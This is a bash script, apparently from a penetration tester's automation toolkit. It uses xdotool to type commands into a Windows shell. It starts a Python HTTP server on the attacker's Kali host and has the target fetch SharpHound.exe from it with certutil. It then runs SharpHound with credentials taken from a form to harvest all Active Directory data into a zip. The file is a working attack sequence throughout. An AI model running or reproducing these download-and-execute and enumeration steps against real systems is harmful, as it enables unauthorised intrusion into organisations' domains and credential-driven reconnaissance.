#!/bin/bash

: '
cmd: Upload sharphound and execute
'

source ~/Desktop/base/code/xdotool/helpers/paste_commands.sh
source ~/Desktop/base/code/xdotool/helpers/get_kali_ip.sh
source ~/Desktop/base/code/xdotool/helpers/generate_gui_form.sh

# Generate gui form
generate_form "http Port"'{"label": "Username", "type": "text", "name": "Username"}'"Password" "Domain" "DC" "NsIP"

USERNAME=${form_data["Username"]}
PASSWORD=${form_data["Password"]}
DOMAIN=${form_data["Domain"]}
DC=${form_data["DC"]}
NSIP=${form_data["NsIP"]}
PORT=${form_data["http Port"]}

cd ${SCRIPTS_DIR}/windows/bloodhound/.files
python3 -m http.server ${PORT} &
HTTP_PID=$!

TMP_FOLDER="C:\Temp"

paste_command "if not exist ${TMP_FOLDER} mkdir ${TMP_FOLDER}"
xdotool key Return
sleep 0.8

paste_command "certutil.exe -urlcache -split -f 'http://${KALI_IP}:${PORT}/SharpHound.exe' '${TMP_FOLDER}\SharpHound.exe'"
xdotool key Return
sleep 2

paste_command "${TMP_FOLDER}\SharpHound.exe -u '${USERNAME}' -p '${PASSWORD}' -d ${DOMAIN} -c All -dc ${DC} -ns ${NSIP} --dns-tcp --zip"
xdotool key Return

sleep 60
kill $HTTP_PID